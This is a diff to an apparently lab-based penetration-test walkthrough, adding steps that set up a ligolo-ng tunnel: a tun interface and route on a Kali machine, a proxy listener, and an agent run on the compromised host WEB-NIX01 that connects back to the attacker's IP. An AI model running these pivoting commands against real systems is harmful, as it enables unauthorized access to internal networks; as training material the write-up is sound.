@@ -642,8 +642,26 @@ On WEB-NIX01, use wget to transfer script over
 
 <img width="1229" height="184" alt="image" src="https://github.com/user-attachments/assets/8d267432-7025-4558-9f46-3d65d886cd2d" />
 
-22.2 Setup interface for internal network
+22.2 On local machine, setup interface for internal network
 
 ```
-
+$ sudo ip tuntap add user joseph12 mode tun ligolo1
+[sudo] password for joseph12: 
+                                                                                                                                                            
+┌──(joseph12㉿kali)-[~/transfer/ligolo-ng]
+└─$ sudo ip link set ligolo1 up                      
+                                                                                                                                                            
+┌──(joseph12㉿kali)-[~/transfer/ligolo-ng]
+└─$ sudo ip route add 172.16.1.0/24 dev ligolo1
 ```
+
+22.3 On local machine, start ligolo-ng proxy
+
+`./lin-proxy -selfcert -laddr 0.0.0.0:1234`
+
+22.4 On WEB-NIX01, run lin-agent and connect back to proxy
+
+`./lin-agent -ignore-cert -connect [LOCAL_IP]:1234`
+
+22.5 Choose session 1 and start ligolo1 tunnel
+
